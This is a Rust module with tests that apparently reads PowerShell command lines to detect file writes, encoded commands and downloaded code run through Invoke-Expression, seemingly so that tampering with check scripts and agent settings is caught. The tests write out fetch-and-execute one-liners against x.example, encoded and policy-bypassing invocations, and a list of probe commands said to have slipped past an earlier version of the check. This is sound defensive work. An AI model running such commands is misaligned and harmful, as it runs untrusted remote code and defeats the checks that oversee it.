/// locates one; a path from a drive, as `C:/x`, stays as written.
fn located(dir: Option<&str>, path: &str) -> String {
    let drive = path.split_once(':').is_some_and(|(drive, _)| {
        drive.len() == 1 && drive.chars().all(|c| c.is_ascii_alphabetic())
    });
    if drive {
        path.to_string()
    } else {
        shell::located(dir, path)
    }
}

/// What a statement pipes on that names paths: literal strings
/// (`'a', 'b' |`), what `Write-Output` is given, the items `Get-Item`
/// and `Get-ChildItem` are given (`.` for none), or, past a cmdlet that
/// only filters or orders what it is piped, that.
fn piped(arguments: &[Argument], input: &Piped) -> Piped {
    let Some((first, _)) = arguments.first().and_then(|argument| argument.first()) else {
        return Piped::default();
    };
    if arguments.iter().flatten().all(|(_, quoted)| *quoted) {
        return Piped {
            paths: arguments
                .iter()
                .flatten()
                .map(|(word, _)| word.clone())
                .collect(),
            items: false,
        };
    }
    let bound = Bound::new(&arguments[1..]);
    let (paths, items) = match command_name(first).as_str() {
        "write-output" | "echo" | "write" => (bound.positional.concat(), false),
        "get-item" | "gi" => (bound.values(PATH_PARAMETERS, 0), true),
        "get-childitem" | "gci" | "ls" | "dir" => {
            let paths = bound.values(PATH_PARAMETERS, 0);
            if paths.is_empty() {
                (vec![".".to_string()], true)
            } else {
                (paths, true)
            }
        }
        name if FILTERS.contains(&name) => (input.paths.clone(), input.items),
        _ => (Vec::new(), false),
    };
    Piped { paths, items }
}

/// Cmdlets that pass on some of what they are piped, in some order.
const FILTERS: &[&str] = &[
    "where-object",
    "where",
    "?",
    "sort-object",
    "sort",
    "select-object",
    "select",
];
/// Cmdlets whose script block runs for each item piped in, as `$_`.
const FOR_EACH: &[&str] = &[
    "foreach-object",
    "%",
    "foreach",
    "where-object",
    "where",
    "?",
];
/// Cmdlets that change the location the statements after them run in.
const LOCATIONS: &[&str] = &[
    "set-location",
    "sl",
    "cd",
    "chdir",
    "push-location",
    "pushd",
    "pop-location",
    "popd",
];

/// The variables a command line has set: each name, lowercase, with the
/// values it may hold.
#[derive(Default)]
struct Variables(Vec<(String, Vec<String>)>);

impl Variables {
    /// Records what a statement of `arguments` sets: `$name = 'value'`,
    /// `$name='value'` or an array of strings. A variable set to anything
    /// else is forgotten.
    fn assign(&mut self, arguments: &[Argument]) {
        let Some(((first, quoted), joined)) =
            arguments.first().and_then(|first| first.split_first())
        else {
            return;
        };
        let Some(first) = first.strip_prefix('$') else {
            return;
        };
        // The variable, the operator, and the words it is set to.
        let (name, operator, values): (&str, &str, Vec<(String, bool)>) =
            match first.split_once('=') {
                // `$name='value'` is one word, which the quotes made.
                Some((name, value)) => (
                    name,
                    "=",
                    std::iter::once((value.to_string(), *quoted))
                        .chain(joined.iter().cloned())
                        .chain(arguments[1..].iter().flatten().cloned())
                        .collect(),
                ),
                None => match arguments.get(1).map(Vec::as_slice) {
                    Some([(operator, false)])
                        if !*quoted && joined.is_empty() && operator.ends_with('=') =>
                    {
                        (
                            first,
                            operator.as_str(),
                            arguments[2..].iter().flatten().cloned().collect(),
                        )
                    }
                    _ => return,
                },
            };
        let name = name.to_ascii_lowercase();
        let name = ["script:", "global:", "local:", "private:"]
            .iter()
            .find_map(|scope| name.strip_prefix(scope))
            .unwrap_or(&name)
            .to_string();
        // `$x+=` and the like change it in ways this reader does not
        // follow.
        if name.ends_with(['+', '-', '*', '/', '%', '?']) {
            return;
        }
        self.0.retain(|(known, _)| *known != name);
        let literal =
            operator == "=" && !values.is_empty() && values.iter().all(|(_, quoted)| *quoted);
        if literal {
            self.0
                .push((name, values.into_iter().map(|(word, _)| word).collect()));
        }
    }

    /// `word` with each `$name` or `${name}` the line set put in, and `$_`,
    /// `$PSItem` and their properties as `item`: one text for each value
    /// they may hold, as many as [`RUNS`].
    fn substituted(&self, word: &str, item: Option<&[String]>) -> Vec<String> {
        if !word.contains('$') {
            return vec![word.to_string()];
        }
        let mut done = vec![String::new()];
        let mut rest = word;
        while let Some(at) = rest.find('$') {
            for text in &mut done {
                text.push_str(&rest[..at]);
            }
            let after = &rest[at + 1..];
            let (name, mut used) = match after.strip_prefix('{') {
                Some(inner) => match inner.find('}') {
                    Some(end) => (&inner[..end], end + 2),
                    None => ("", 0),
                },
                None => {
                    let end = after
                        .find(|c: char| !(c.is_ascii_alphanumeric() || c == '_' || c == ':'))
                        .unwrap_or(after.len());
                    (&after[..end], end)
                }
            };
            let lower = name.to_ascii_lowercase();
            let values = if lower == "_" || lower == "psitem" {
                // An item's `.FullName` or `.Name` is the item, as near as
                // this reader can name it.
                let property = after[used..]
                    .strip_prefix('.')
                    .map(|rest| {
                        rest.find(|c: char| !(c.is_ascii_alphanumeric() || c == '_'))
                            .unwrap_or(rest.len())
                    })
                    .filter(|length| *length > 0);
                if let Some(length) = property {
                    used += 1 + length;
                }
                item
            } else {
                self.0
                    .iter()
                    .find(|(known, _)| *known == lower)
                    .map(|(_, values)| values.as_slice())
            };
            match values {
                Some(values) if !values.is_empty() => {
                    done = done
                        .iter()
                        .flat_map(|text| values.iter().map(move |value| format!("{text}{value}")))
                        .take(RUNS)
                        .collect();
                    rest = &after[used..];
                }
                _ => {
                    for text in &mut done {
                        text.push('$');
                    }
                    rest = after;
                }
            }
        }
        for text in &mut done {
            text.push_str(rest);
        }
        done
    }
}

/// How many values one word may stand for.
const RUNS: usize = 64;

/// Moves `dirs` past a statement of `arguments` that changes the location:
/// to the directory it names, or to one this reader cannot name. Only after
/// `Set-Location x &&` do the statements surely run there.
fn moved(dirs: &mut Vec<Option<String>>, arguments: &[Argument], certain: bool) {
    let Some((first, _)) = arguments.first().and_then(|argument| argument.first()) else {
        return;
    };
    let name = command_name(first);
    if !LOCATIONS.contains(&name.as_str()) {
        return;
    }
    let target = if matches!(name.as_str(), "pop-location" | "popd") {
        None
    } else {
        Bound::new(&arguments[1..])
            .values(PATH_PARAMETERS, 0)
            .first()
            .filter(|target| target.as_str() != "-")
            .and_then(|target| file_path(target))
    };
    let next: Vec<Option<String>> = dirs
        .iter()
        .map(|dir| {
            let target = target.as_deref()?;
            let drive = target
                .split_once(':')
                .is_some_and(|(drive, _)| drive.len() == 1);
            if drive || target.starts_with(['/', '~', '$']) {
                Some(target.to_string())
            } else {
                dir.as_deref().map(|dir| shell::joined(dir, target))
            }
        })
        .collect();
    if certain {
        *dirs = next;
    } else {
        dirs.extend(next);
    }
    let mut seen = HashSet::new();
    dirs.retain(|dir| seen.insert(dir.clone()));
    if dirs.len() > 8 {
        dirs.truncate(7);
        if !dirs.contains(&None) {
            dirs.push(None);
        }
    }
}

/// A script block or a nested expression being read.
struct Block {
    /// What `$_` stood for outside it.
    item: Option<Vec<String>>,
    /// What a `Where-Object` block passes on when it closes.
    passes: Option<Piped>,
}

/// Read a PowerShell `command` for the writes and downloads it names.
pub fn read(command: &str) -> Reading {
    read_at(command, 0)
}

/// Read `command`, code handed over as a string `depth` times. A script's
/// text is read one deeper than the code that runs it.
pub fn read_at(command: &str, depth: usize) -> Reading {
    let tokens = tokens(command);
    if depth > DEPTH {
        let writes = tokens
            .iter()
            .filter_map(|token| match token {
                Token::Word(word, _) => file_path(word),
                _ => None,
            })
            .collect();
        return Reading {
            writes,
            ..Reading::default()
        };
    }
    let mut reading = Reading::default();
    let mut remote = None;
    let mut names: Vec<String> = Vec::new();
    let mut arguments: Vec<Argument> = Vec::new();
    // What the statement being read writes by redirection or a method.
    let mut redirected: Vec<String> = Vec::new();
    // What the statement before pipes into this one.
    let mut input = Piped::default();
    let mut vars = Variables::default();
    // Where statements run, relative to where the line starts, as the
    // shell reader tracks it: a location changes for what follows, inside
    // a script block or not.
    let mut dirs: Vec<Option<String>> = vec![Some(String::new())];
    let mut item: Option<Vec<String>> = None;
    let mut blocks: Vec<Block> = Vec::new();
    let mut passed: Option<Piped> = None;
    let mut joining = false;
    let mut at = 0;
    while at <= tokens.len() {
        let token = tokens.get(at);
        match token {
            Some(Token::Word(word, quoted)) => {
                if let (Some(method), Some(Token::Open)) = (dotnet(word), tokens.get(at + 1)) {
                    // The method's arguments, up to its closing parenthesis.
                    let mut nesting = 0;
                    let mut position = 0;
                    let mut taken: Vec<Option<String>> = Vec::new();
                    // The words after its first argument.
                    let mut rest: Vec<String> = Vec::new();
                    at += 1;
                    while at < tokens.len() {
                        match &tokens[at] {
                            Token::Open => nesting += 1,
                            Token::Close => {
                                nesting -= 1;
                                if nesting == 0 {
                                    break;
                                }
                            }
                            Token::Comma if nesting == 1 => position += 1,
                            Token::Word(argument, _) => {
                                // An argument's first word: a literal path,
                                // or the start of an expression.
                                if nesting == 1 && taken.len() <= position {
                                    taken.resize(position + 1, None);
                                    taken[position] = Some(argument.clone());
                                }
                                if position > 0 {
                                    rest.push(argument.clone());
                                }
                            }
                            _ => {}
                        }
                        at += 1;
                    }
                    let changes: &[usize] = match method {
                        Method::Changes(positions) => positions,
                        Method::Opens if reads_only(&rest) => &[],
                        Method::Opens => &[0],
                    };
                    for taken in taken.iter().flatten() {
                        reading.named.push(taken.clone());
                    }
                    for position in changes {
                        if let Some(Some(path)) = taken.get(*position) {
                            redirected.extend(vars.substituted(path, item.as_deref()));
                        }
                    }
                    at += 1;
                    continue;
                }
                // A variable a statement starts with is what it sets, or
                // an expression, never a command this reader looks up.
                let values: Vec<(String, bool)> = if arguments.is_empty() && word.starts_with('$') {
                    vec![(word.clone(), *quoted)]
                } else {
                    vars.substituted(word, item.as_deref())
                        .into_iter()
                        .map(|value| (value, *quoted))
                        .collect()
                };
                if joining && !arguments.is_empty() {
                    arguments.last_mut().expect("not empty").extend(values);
                } else if !(arguments.is_empty() && !*quoted && word == ".") {
                    // `.` dot-sources the command after it.
                    arguments.push(values);
                }
                joining = false;
            }
            Some(Token::Comma) => joining = true,
            Some(Token::WriteTo) => {
                if let Some(Token::Word(target, _)) = tokens.get(at + 1) {
                    redirected.extend(vars.substituted(target, item.as_deref()));
                    at += 1;
                }
            }
            // A `Where-Object` block passes on what it was piped.
            Some(Token::Pipe) if arguments.is_empty() && passed.is_some() => {
                input = passed.take().unwrap_or_default();
            }
            token => {
                passed = None;
                let piping = token == Some(&Token::Pipe);
                let name = arguments
                    .first()
                    .and_then(|argument| argument.first())
                    .map(|(word, _)| command_name(word));
                if let Some(name) = &name {
                    names.push(name.clone());
                }
                let mut found = changed_at(&arguments, &input, depth);
                found.writes.append(&mut redirected);
                found
                    .named
                    .extend(arguments.iter().flatten().map(|(word, _)| word.clone()));
                for path in found.writes.drain(..).filter_map(|path| file_path(&path)) {
                    for dir in &dirs {
                        reading.writes.push(located(dir.as_deref(), &path));
                    }
                }
                for path in found.named.drain(..).filter_map(|path| file_path(&path)) {
                    for dir in &dirs {
                        reading.named.push(located(dir.as_deref(), &path));
                    }
                }
                for script in found.scripts.drain(..) {
                    let Some(path) = file_path(&script.path) else {
                        continue;
                    };
                    for dir in &dirs {
                        reading.scripts.push(Script {
                            path: located(dir.as_deref(), &path),
                            dir: located(dir.as_deref(), &script.dir),
                            ..script.clone()
                        });
                    }
                }
                for code in found.code.drain(..) {
                    for dir in &dirs {
                        reading.code.push(shell::Code {
                            dir: located(dir.as_deref(), &code.dir),
                            ..code.clone()
                        });
                    }
                }
                reading.unread.append(&mut found.unread);
                remote = remote.or(found.remote_code);
                let piped_in = !input.paths.is_empty() || input.items;
                if !piping && !piped_in {
                    moved(&mut dirs, &arguments, token == Some(&Token::And));
                }
                vars.assign(&arguments);
                let on = if piping {
                    piped(&arguments, &input)
                } else {
                    Piped::default()
                };
                match token {
                    Some(Token::Open) => {
                        let each = name.as_deref().is_some_and(|name| FOR_EACH.contains(&name))
                            && piped_in;
                        let passes = name
                            .as_deref()
                            .is_some_and(|name| FILTERS.contains(&name))
                            .then(|| Piped {
                                paths: input.paths.clone(),
                                items: input.items,
                            });
                        blocks.push(Block {
                            item: item.clone(),
                            passes,
                        });
                        if each {
                            item = Some(input.paths.clone());
                        }
                    }
                    Some(Token::Close) => {
                        if let Some(block) = blocks.pop() {
                            item = block.item;
                            passed = block.passes;
                        }
                    }
                    _ => {}
                }
                input = on;
                arguments.clear();
                joining = false;
            }
        }
        at += 1;
    }

    // Downloaded code handed to `Invoke-Expression`, in either order:
    // `irm x | iex`, `iex (irm x)`, `iex ((New-Object Net.WebClient)
    // .DownloadString(x))`, or a script block made from it.
    let fetcher = names.iter().find(|name| {
        FETCHERS.contains(&name.as_str())
            || name.contains("downloadstring")
            || name.contains("downloaddata")
    });
    let evaluator = names.iter().find(|name| {
        EVALUATORS.contains(&name.as_str()) || name.starts_with("[scriptblock]::create")
    });
    let remote_code = match (fetcher, evaluator) {
        (Some(fetcher), Some(evaluator)) => Some(format!(
            "{} | {}",
            fetcher.trim_start_matches('.'),
            evaluator
        )),
        _ => None,
    };
    reading.remote_code = remote_code.or(remote);
    let mut seen = HashSet::new();
    reading.writes.retain(|path| seen.insert(path.clone()));
    let mut seen = HashSet::new();
    reading
        .named
        .retain(|path| !path.is_empty() && seen.insert(path.clone()));
    reading
}

#[cfg(test)]
mod tests {
    use super::*;

    fn writes(command: &str) -> Vec<String> {
        read(command).writes
    }

    #[test]
    fn environment_variables_and_locations_are_kept_for_the_caller() {
        assert_eq!(
            writes("Set-Content $env:USERPROFILE\\.claude\\settings.json '{}'"),
            ["$env:USERPROFILE/.claude/settings.json"]
        );
        assert_eq!(
            writes("Remove-Item ${env:APPDATA}\\x"),
            ["${env:APPDATA}/x"]
        );
        assert_eq!(writes("Remove-Item $HOME/x, $PWD/y"), ["$HOME/x", "$PWD/y"]);
        // Another variable is not a path this reader can name.
        assert_eq!(writes("Remove-Item $other/x"), Vec::<String>::new());
        // After `;`, the location may not have changed; after `&&` it has.
        assert_eq!(
            writes("Set-Location tests; Remove-Item a.sh"),
            ["a.sh", "tests/a.sh"]
        );
        assert_eq!(writes("cd tests && del a.sh"), ["tests/a.sh"]);
        assert_eq!(
            writes("Push-Location C:\\x; del a.sh"),
            ["a.sh", "C:/x/a.sh"]
        );
        assert_eq!(
            writes("Set-Location $env:TEMP; del a"),
            ["a", "$env:TEMP/a"]
        );
    }

    #[test]
    fn variables_the_line_sets_are_put_in() {
        assert_eq!(writes("$f = 'check.sh'; Remove-Item $f"), ["check.sh"]);
        assert_eq!(writes("$F='a', 'b'\nrm $f"), ["a", "b"]);
        assert_eq!(writes("$f = 'a'; $f = 'b'; del $f"), ["b"]);
        assert_eq!(writes("$f = 'a'; $f += 'b'; del $f"), Vec::<String>::new());
        assert_eq!(writes("$f = \"x\"; Set-Content -Path ${f}.sh y"), ["x.sh"]);
        // Set to what a cmdlet returns, it is not known.
        assert_eq!(
            writes("$f = Get-Item x; Remove-Item $f"),
            Vec::<String>::new()
        );
        assert_eq!(
            writes("Get-ChildItem tests | ForEach-Object { Remove-Item $_.FullName }"),
            ["tests"]
        );
        assert_eq!(writes("ls | % { del $_ }"), ["."]);
        assert_eq!(writes("'a', 'b' | foreach { rm $PSItem }"), ["a", "b"]);
        // Outside a block, `$_` is nothing piped.
        assert_eq!(writes("Remove-Item $_"), Vec::<String>::new());
    }

    #[test]
    fn code_powershell_is_given_is_read_again() {
        let encoded = |code: &str| {
            let bytes: Vec<u8> = code.encode_utf16().flat_map(u16::to_le_bytes).collect();
            super::super::digest::base64_encode(&bytes)
        };
        assert_eq!(
            writes(&format!(
                "powershell -EncodedCommand {}",
                encoded("del check.sh")
            )),
            ["check.sh"]
        );
        assert_eq!(
            writes(&format!("pwsh -NoProfile -e {}", encoded("rm x"))),
            ["x"]
        );
        let unread = read("pwsh -enc abc").unread;
        assert_eq!(unread[0].shape, "powershell -EncodedCommand");
        // Odd bytes are not UTF-16.
        let unread = read("pwsh -ec AAAA").unread;
        assert_eq!(unread.len(), 1);
        assert_eq!(writes("pwsh -Command 'rm x'"), ["x"]);
        assert_eq!(writes("pwsh -wd C:\\ -c 'rm x'"), ["x"]);
        let scripts = |command: &str| {
            read(command)
                .scripts
                .into_iter()
                .map(|script| (script.path, script.runner))
                .collect::<Vec<_>>()
        };
        let ps = |path: &str| vec![(path.to_string(), Runner::PowerShell)];
        assert_eq!(scripts("pwsh -File .\\x.ps1 -Force"), ps("./x.ps1"));
        assert_eq!(scripts("powershell -NoProfile x.ps1"), ps("x.ps1"));
        assert_eq!(scripts("& ./x.ps1"), ps("./x.ps1"));
        assert_eq!(scripts(". .\\x.ps1"), ps("./x.ps1"));
        assert_eq!(scripts("cd d && ./x.ps1"), ps("d/x.ps1"));
        assert!(scripts("Get-Content x.ps1").is_empty());
    }

    #[test]
    fn start_process_is_read_as_the_program_it_starts() {
        assert_eq!(
            writes("Start-Process pwsh -ArgumentList '-Command', 'rm x'"),
            ["x"]
        );
        assert_eq!(
            writes("Start-Process -FilePath cmd -ArgumentList '/c del x' -Wait"),
            ["x"]
        );
        assert_eq!(writes("saps -FilePath sh -Args '-c \"rm a\"'"), ["a"]);
        assert_eq!(
            writes("Start-Process git -RedirectStandardOutput out.txt -ArgumentList status"),
            ["out.txt"]
        );
        assert_eq!(writes("Start-Process notepad"), Vec::<String>::new());
        assert_eq!(
            read("Start-Process python -ArgumentList '-c', 'print(1)'").code[0].text,
            "print(1)"
        );
    }

    #[test]
    fn redirections_name_the_file_they_write() {
        assert_eq!(writes("'exit 0' > check.sh"), ["check.sh"]);
        assert_eq!(
            writes("cargo test 2>&1 >> .\\logs\\run.log"),
            ["./logs/run.log"]
        );
        assert_eq!(writes("cargo test *> $null"), Vec::<String>::new());
        assert_eq!(writes("node x.js 2> err.txt"), ["err.txt"]);
        // Quoted, a `>` is text.
        assert_eq!(
            writes("Write-Output 'a > b' \"c > d\""),
            Vec::<String>::new()
        );
    }

    #[test]
    fn cmdlets_and_their_aliases_name_the_paths_they_change() {
        assert_eq!(writes("Set-Content check.sh 'exit 0'"), ["check.sh"]);
        assert_eq!(
            writes("set-content -Value 'exit 0' -Path D:\\dev\\flot\\check.sh"),
            ["D:/dev/flot/check.sh"]
        );
        assert_eq!(writes("sc -Pat check.sh -Val x"), ["check.sh"]);
        assert_eq!(writes("Add-Content -LiteralPath:check.sh x"), ["check.sh"]);
        assert_eq!(
            writes("'x' | Out-File -FilePath out.txt -Encoding utf8"),
            ["out.txt"]
        );
        assert_eq!(
            writes("Remove-Item -Recurse -Force .flot, build"),
            [".flot", "build"]
        );
        assert_eq!(writes("del check.sh"), ["check.sh"]);
        assert_eq!(
            writes("del 'it''s.sh', \"say \"\"hi\"\".sh\""),
            ["it's.sh", "say \"hi\".sh"]
        );
        assert_eq!(
            writes("Move-Item check.sh old.sh"),
            ["check.sh", "old.sh", "old.sh/check.sh"]
        );
        // Into a directory, only what lands in it; one source to a name
        // that may be a file, both.
        assert_eq!(
            writes("Copy-Item -Path C:\\tmp\\fake.sh -Destination tests\\"),
            ["tests/fake.sh"]
        );
        assert_eq!(
            writes("Copy-Item a.sh, b.sh tests"),
            ["tests/a.sh", "tests/b.sh"]
        );
        assert_eq!(writes("Copy-Item x.sh tests"), ["tests", "tests/x.sh"]);
        assert_eq!(
            writes("Rename-Item -LiteralPath tests\\check.sh old.sh"),
            ["tests/check.sh", "tests/old.sh"]
        );
        assert_eq!(
            writes("mv -Path a.sh check.sh"),
            ["a.sh", "check.sh", "check.sh/a.sh"]
        );
        assert_eq!(
            writes("Rename-Item tests\\check.sh old.sh"),
            ["tests/check.sh", "tests/old.sh"]
        );
        assert_eq!(
            writes("New-Item -ItemType File -Path tests -Name check.sh -Force"),
            ["tests/check.sh"]
        );
        assert_eq!(writes("ni flot.toml"), ["flot.toml"]);
        assert_eq!(writes("$r = Remove-Item check.sh"), ["check.sh"]);
        assert_eq!(
            writes("iwr https://x.example -OutFile check.sh"),
            ["check.sh"]
        );
        // `$_` in the block is each item piped in, a listing of `*.sh` as
        // `*.sh`.
        assert_eq!(
            writes(
                "Get-ChildItem *.sh | ForEach-Object { Remove-Item $_ }; Clear-Content flot.toml"
            ),
            ["*.sh", "flot.toml"]
        );
        assert_eq!(
            writes("[System.IO.File]::WriteAllText('check.sh', 'exit 0')"),
            ["check.sh"]
        );
        assert_eq!(
            writes("[IO.File]::Copy(\"a.sh\", \"check.sh\", $true)"),
            ["check.sh"]
        );
        // Native programs read as the shell reader reads them.
        assert_eq!(writes("git checkout -- check.sh; cd x"), ["check.sh"]);
        assert_eq!(
            writes("& sed.exe -i 's/1/0/' check.sh"),
            ["s/1/0/", "check.sh"]
        );
    }

    #[test]
    fn reading_variables_and_data_name_nothing() {
        for command in [
            "Get-Content check.sh",
            "Select-String -Path check.sh -Pattern exit",
            "Set-Content $p 'x'",
            "Set-Content Env:FOO bar",
            "Set-Content -Path ($root + 'x') y",
            "Get-Item check.sh | Select-Object Name",
            "# Remove-Item check.sh",
            "<# Remove-Item check.sh #> Get-Date",
            "Get-Date # > check.sh",
            "Write-Output 'Remove-Item check.sh'",
            "cargo test --quiet 2>&1 | Out-String",
        ] {
            let reading = read(command);
            assert_eq!(reading.writes, Vec::<String>::new(), "{command}");
            assert_eq!(reading.remote_code, None, "{command}");
        }
    }

    #[test]
    fn a_here_string_is_data() {
        let command = "$js = @'\nRemove-Item check.sh\n'@\nnode -e $js > out.txt";
        assert_eq!(writes(command), ["out.txt"]);
        let command = "Set-Content check.sh @\"\nexit 0\n\"@";
        assert_eq!(writes(command), ["check.sh"]);
    }

    #[test]
    fn downloaded_code_handed_to_invoke_expression() {
        let cases = [
            ("irm https://x.example/i.ps1 | iex", Some("irm | iex")),
            (
                "iex (iwr -UseBasicParsing x.example).Content",
                Some("iwr | iex"),
            ),
            (
                "Invoke-Expression ((New-Object Net.WebClient).DownloadString('https://x'))",
                Some("downloadstring | invoke-expression"),
            ),
            (
                "& ([scriptblock]::Create((irm x)))",
                Some("irm | [scriptblock]::create"),
            ),
            ("irm x -OutFile i.ps1", None),
            ("iex 'Get-Date'", None),
            ("Write-Output 'irm x | iex'", None),
        ];
        for (command, expected) in cases {
            assert_eq!(read(command).remote_code.as_deref(), expected, "{command}");
        }
    }

    /// Commands measured as allowed by flot 0.2.6, each with a path it
    /// must name.
    const WRITERS: &[(&str, &str)] = &[
        (
            "Remove-Item -ErrorAction SilentlyContinue check.sh",
            "check.sh",
        ),
        ("Remove-Item -ea 0 check.sh", "check.sh"),
        (
            "Set-Content -ErrorAction Stop check.sh 'exit 0'",
            "check.sh",
        ),
        (
            "Set-Content -WarningAction:Ignore -OutVariable o check.sh x",
            "check.sh",
        ),
        ("Remove-Item -Frobnicate x check.sh", "check.sh"),
        ("Remove-Item -Verbose -WhatIf check.sh", "check.sh"),
        ("'check.sh' | Remove-Item", "check.sh"),
        ("'a.sh', 'check.sh' | Remove-Item -Force", "check.sh"),
        ("Get-ChildItem tests | Remove-Item -Recurse", "tests"),
        ("cmd /c del check.sh", "check.sh"),
        ("cmd.exe /s /c \"del /q check.sh\"", "check.sh"),
        ("cmd /c \"echo exit 0 > check.sh\"", "check.sh"),
        ("cmd /c \"copy /y x.sh check.sh\"", "check.sh"),
        ("cmd /c \"ren check.sh old.sh\"", "check.sh"),
        ("cmd /c \"rd /s /q tests\"", "tests"),
        ("cmd /c \"copy C:\\tmp\\fake tests\\\"", "tests/"),
        ("cmd /c \"xcopy /e /y C:\\tmp\\fake tests\\\"", "tests/"),
        ("cmd /c robocopy C:\\tmp\\fake tests /mir", "tests"),
        ("cmd /c \"cd x & git checkout -- check.sh\"", "check.sh"),
        ("powershell -Command \"Remove-Item check.sh\"", "check.sh"),
        (
            "pwsh -NoProfile -ExecutionPolicy Bypass -c 'Set-Content check.sh x'",
            "check.sh",
        ),
        ("powershell.exe \"Remove-Item check.sh\"", "check.sh"),
        ("iex \"Remove-Item check.sh\"", "check.sh"),
        (
            "Invoke-Expression -Command 'Remove-Item check.sh'",
            "check.sh",
        ),
        ("[IO.File]::OpenWrite('check.sh')", "check.sh"),
        ("[IO.StreamWriter]::new('check.sh')", "check.sh"),
        (
            "[System.IO.File]::AppendAllText('check.sh', 'x')",
            "check.sh",
        ),
        ("[IO.File]::Open('check.sh', 'Create')", "check.sh"),
        (
            "[IO.File]::Open('check.sh', [IO.FileMode]::Open)",
            "check.sh",
        ),
        (
            "[IO.FileStream]::new('check.sh', 'Truncate', 'Write')",
            "check.sh",
        ),
        (
            "[IO.File]::SetLastWriteTime('check.sh', (Get-Date))",
            "check.sh",
        ),
        (
            "[IO.File]::WriteAllText(\"$PWD\\check.sh\", 'x')",
            "$PWD/check.sh",
        ),
        ("Set-Content FileSystem::check.sh 'exit 0'", "check.sh"),
        (
            "Set-Content Microsoft.PowerShell.Core\\FileSystem::check.sh x",
            "check.sh",
        ),
        ("curl.exe -o check.sh https://x.example/p", "check.sh"),
        ("bash -c 'rm check.sh'", "check.sh"),
        ("Clear-Item check.sh", "check.sh"),
        ("Clear-Content check.sh", "check.sh"),
        ("'x' | Out-File check.sh", "check.sh"),
        ("Add-Content check.sh x", "check.sh"),
        ("New-Item -Force check.sh", "check.sh"),
        ("Set-Content *.sh x", "*.sh"),
        ("Remove-Item -Recurse tests", "tests"),
    ];

    #[test]
    fn common_parameters_take_their_values() {
        assert_eq!(
            writes("Remove-Item -ErrorAction SilentlyContinue check.sh"),
            ["check.sh"]
        );
        assert_eq!(
            writes("Remove-Item -ea 0 -WarningVariable w check.sh"),
            ["check.sh"]
        );
        assert_eq!(
            writes("Set-Content -OutVariable o check.sh x"),
            ["check.sh"]
        );
        // Not known, the parameter may take the path or a value.
        assert_eq!(
            writes("Remove-Item -Frobnicate x check.sh"),
            ["x", "check.sh"]
        );
    }

    #[test]
    fn the_probe_commands_name_what_they_write() {
        let missed: Vec<String> = WRITERS
            .iter()
            .filter_map(|(command, path)| {
                let found = writes(command);
                (!found.iter().any(|written| written == path))
                    .then(|| format!("{command:?} names {found:?}, not {path:?}"))
            })
            .collect();
        assert!(missed.is_empty(), "{}", missed.join("\n"));
    }

    #[test]
    fn reading_commands_do_not_name_what_they_read() {
        let named: Vec<String> = [
            "Get-Content -ErrorAction Stop check.sh",
            "[IO.File]::ReadAllText('check.sh')",
            "[System.IO.File]::Exists('check.sh')",
            "[IO.File]::Open('check.sh', 'Open', 'Read')",
            "[IO.FileStream]::new('check.sh', [IO.FileMode]::Open, [IO.FileAccess]::Read)",
            "[IO.StreamReader]::new('check.sh')",
            "[IO.Path]::Combine('tests', 'check.sh')",
            "Test-Path check.sh",
            "Get-Item check.sh | Select-Object Name",
            "'check.sh' | Select-String exit",
            "cmd /c type check.sh",
            "cmd /c \"echo check.sh > nul\"",
            "powershell -Command \"Get-Content check.sh\"",
            "pwsh -File check.ps1",
            "iex 'Get-Content check.sh'",
        ]
        .iter()
        .filter_map(|command| {
            let found = writes(command);
            found
                .iter()
                .any(|path| path == "check.sh" || path == "tests" || path.starts_with("tests/"))
                .then(|| format!("{command:?} names {found:?}"))
        })
        .collect();
        assert!(named.is_empty(), "{}", named.join("\n"));
    }
}
